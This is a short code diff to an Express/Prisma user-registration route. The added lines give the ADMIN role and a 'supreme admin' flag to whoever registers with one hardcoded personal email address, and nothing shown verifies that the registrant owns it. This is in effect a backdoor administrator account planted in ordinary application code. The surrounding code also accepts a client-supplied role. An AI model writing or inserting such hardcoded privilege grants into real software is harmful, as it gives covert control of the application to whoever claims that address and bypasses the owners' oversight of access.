@@ -77,8 +77,17 @@ router.post("/register", authLimiter, async (req, res, next) => {
     const { email, password, displayName, role } = validation;
     const passwordHash = await bcrypt.hash(password, env.bcryptRounds);
 
+    const isSupreme = (email.toLowerCase() === 'mukundram165250@gmail.com');
+    const assignedRole = isSupreme ? 'ADMIN' : role;
+
     const user = await prisma.user.create({
-      data: { email, passwordHash, displayName, role },
+      data: {
+        email,
+        passwordHash,
+        displayName: isSupreme ? (displayName || 'Mukundram') : displayName,
+        role: assignedRole,
+        isSupremeAdmin: isSupreme
+      },
       select: publicUserSelect
     });
 
